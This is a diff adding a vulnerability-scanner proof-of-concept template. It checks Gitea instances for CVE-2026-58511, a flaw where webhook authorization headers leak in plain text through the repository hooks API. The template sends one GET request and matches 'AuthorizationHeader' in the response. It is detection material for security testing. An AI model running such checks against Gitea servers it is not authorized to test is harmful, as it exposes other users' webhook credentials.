@@ -1,0 +1,28 @@
+[info]
+author = "ave"
+description = "验证Gitea实例中是否存在通过API接口以明文形式泄露Webhook授权头的漏洞。利用攻击者拥有仓库管理员权限，使用有效的凭证创建包含敏感授权头的Webhook，然后以另一个仓库管理员身份调用`GET /api/v1/repos/{owner}/{repo}/hooks`接口，检查响应中是否包含来自管理员A的完整明文授权头，从而验证是否有敏感凭证被泄露。"
+id = "POC-AVE-2026-0684"
+name = "CVE-2026-58511 Webhook Authorization Header Disclosure PoC"
+severity = "medium"
+tags = ["ave-2026-0684"]
+vuln_id = [
+    "CVE-2026-58511",
+    "AVE-2026-0684",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/api/v1/repos/{{owner}}/{{repo}}/hooks"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AuthorizationHeader"]
